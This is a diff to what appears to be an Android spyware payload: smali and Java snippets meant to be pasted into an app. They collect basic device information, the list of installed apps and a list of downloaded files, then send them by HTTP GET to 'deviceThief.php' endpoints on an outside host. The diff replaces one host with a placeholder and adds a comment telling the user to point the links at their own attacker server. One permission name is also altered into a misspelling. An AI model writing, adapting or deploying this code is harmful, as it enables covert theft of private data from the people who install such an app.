@@ -1,6 +1,6 @@
 AndroidManifest.xml: 
 android.permission.INTERNET
-android.permission.READ_EXTERNAL_STORAGE
+android.permission.READ_EXTERNAL_STORAGEl
 
 #method. Suggested to paste it at the end of the code.
 ********************************************************
@@ -571,7 +571,7 @@ android.permission.READ_EXTERNAL_STORAGE
 
     invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V
 
-    const-string v24, "http://judgesimulator.000webhostapp.com/deviceThief.php"
+    const-string v24, "http://abcd.000webhostapp.com/deviceThief.php"
 
     invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
 
@@ -662,7 +662,7 @@ android.permission.READ_EXTERNAL_STORAGE
 
     invoke-direct/range {v22 .. v22}, Ljava/lang/StringBuffer;-><init>()V
 
-    const-string v22, "http://judgesimulator.000webhostapp.com/deviceThief2.php"
+    const-string v22, "http://abcd.000webhostapp.com/deviceThief2.php"
 
     invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
 
@@ -950,8 +950,9 @@ invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_
 		}
 		
 		HttpClient httpClient = new DefaultHttpClient();
-		HttpGet get = new HttpGet("http://judgesimulator.000webhostapp.com/deviceThief.php" + "?basic=" + a + "&applist=" + b);
-		HttpGet get2 = new HttpGet("http://judgesimulator.000webhostapp.com/deviceThief2.php" + "?downloadlist=" + c);
+                //change these two links in smali to your own links, they represent the attacker's server.
+		HttpGet get = new HttpGet("http://abcd.000webhostapp.com/deviceThief.php" + "?basic=" + a + "&applist=" + b);
+		HttpGet get2 = new HttpGet("http://abcd.000webhostapp.com/deviceThief2.php" + "?downloadlist=" + c);
 		
 		try
 		{
